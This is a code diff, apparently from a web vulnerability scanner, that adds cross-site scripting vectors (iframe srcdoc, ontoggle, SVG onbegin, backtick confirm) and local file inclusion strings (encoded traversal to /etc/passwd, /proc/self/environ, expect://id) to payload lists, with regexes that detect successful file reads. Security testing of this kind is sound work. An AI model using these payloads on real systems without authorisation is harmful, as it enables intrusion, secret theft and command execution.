@@ -150,6 +150,10 @@ const XSS_PAYLOADS = (m) => [
   { p: `'><img src=x onerror=${m}>`, ctx: "attr-single" },
   { p: `javascript:${m}`, ctx: "url" },
   { p: `${m}"-alert(1)-"`, ctx: "js" },
+  { p: `<iframe srcdoc="<script>${m}</script>">`, ctx: "html" },
+  { p: `<details/open/ontoggle=alert(1)>${m}`, ctx: "html" },
+  { p: `"><svg><animate onbegin=alert(1) attributeName=x></svg>${m}`, ctx: "attr" },
+  { p: `<img src=x onerror=confirm\`1\`>${m}`, ctx: "html-nobracket" },
 ];
 
 const LFI_PAYLOADS = [
@@ -157,6 +161,9 @@ const LFI_PAYLOADS = [
   "....//....//....//etc/passwd", "/etc/passwd%00",
   "..\\..\\..\\windows\\win.ini", "C:\\windows\\win.ini",
   "php://filter/convert.base64-encode/resource=index",
+  "..%252f..%252f..%252fetc%252fpasswd",
+  "/proc/self/environ", "/proc/self/cmdline",
+  "expect://id", "data://text/plain,YORU",
 ];
 const LFI_MARKERS = [/root:x:0:0:/i, /\[extensions\]/i, /for 16-bit app support/i, /PD9waHA/];
 
